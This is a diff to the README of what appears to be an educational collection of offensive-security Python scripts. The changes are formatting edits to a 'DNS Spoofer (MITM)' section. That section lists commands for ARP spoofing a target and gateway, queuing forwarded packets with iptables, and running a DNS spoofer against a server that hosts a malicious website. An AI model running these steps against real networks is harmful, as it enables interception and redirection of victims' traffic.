@@ -29,6 +29,6 @@ A small collection of Python scripts to demonstrate basic offensive security tec
 
 ### 5. DNS Spoofer (MITM)
 > python3 3_arpspoof.py -t 192.168.111.135 -g 192.168.111.2<br>
-> iptables -I FORWARD -j NFQUEUE --queue-num 0
+> iptables -I FORWARD -j NFQUEUE --queue-num 0 <br>
 > python3 5_dns_spoofer.py 
-#### *step-1 : run 3_arp_spoof.py to create an MITM<br> step-2: modify iptables to create queues for storing incoming packets<br> step-3: run 5_dns_spoofer.py to create spoofing <br> You need to run another server hosting malicious website*
+##### *step-1 : run 3_arp_spoof.py to create an MITM<br> step-2: modify iptables to create queues for storing incoming packets<br> step-3: run 5_dns_spoofer.py to create spoofing <br> You need to run another server hosting malicious website*
